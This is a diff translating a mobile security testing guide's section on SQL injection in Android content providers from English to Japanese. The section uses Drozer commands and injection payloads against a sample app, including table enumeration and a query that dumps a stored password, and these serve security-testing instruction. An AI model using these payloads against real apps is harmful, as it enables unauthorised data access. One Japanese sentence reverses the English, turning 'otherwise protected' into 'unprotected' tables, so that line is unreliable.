@@ -764,9 +764,9 @@ dz> run app.provider.delete content://settings/secure
                 --selection-args my_setting
 ```
 
-##### SQL Injection in Content Providers
+##### コンテンツプロバイダでのSQLインジェクション
 
-The Android platform promotes the use of SQLite databases for storing user data. Since these databases use SQL, they can be vulnerable to SQL injection. The Drozer module `app.provider.query` can be used to test for SQL injection by manipulating the projection and selection fields that are passed to the content provider:
+Android プラットフォームはユーザーデータの格納に SQLite データベースの使用を勧めます。これらのデータベースは SQL を使用するため、SQL インジェクションに脆弱となる可能性があります。Drozer モジュール `app.provider.query` を使用して、SQL インジェクションのテストできます。コンテンツプロバイダに渡される projection と selection フィールドを操作します。
 
 ```
 dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'"
@@ -776,7 +776,7 @@ dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Pas
 unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
 ```
 
-If vulnerable to SQL Injection, the application will return a verbose error message. SQL Injection in Android can be exploited to modify or query data from the vulnerable content provider. In the following example, the Drozer module `app.provider.query` is used to list all tables in the database:
+SQL インジェクションの脆弱性がある場合、アプリケーションは詳細なエラーメッセージを返します。Android の SQL インジェクションを悪用して、脆弱なコンテンツプロバイダのデータを変更または照会できます。以下の例では、Drozer モジュール `app.provider.query` を使用して、データベースのすべてのテーブルをリストします。
 
 ```
 dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "*
@@ -787,7 +787,7 @@ FROM SQLITE_MASTER WHERE type='table';--"
 | table | Key              | Key              | 5        | CREATE TABLE ... |
 ```
 
-SQL Injection can also be exploited to retrieve data from otherwise protected tables:
+SQL インジェクションを悪用して、保護されていないテーブルからデータを取得することもできます。
 
 ```
 dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM Key;--"
@@ -795,7 +795,7 @@ dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Pas
 | thisismypassword | 9876 |
 ```
 
-These steps can be automated by using the `scanner.provider.injection` module, which automatically finds vulnerable content providers within an app:
+これらのステップを自動化するには `scanner.provider.injection` モジュールを使用できます。アプリ内の脆弱なコンテンツプロバイダを自動的に見つけます。
 
 ```
 dz> run scanner.provider.injection -a com.mwr.example.sieve
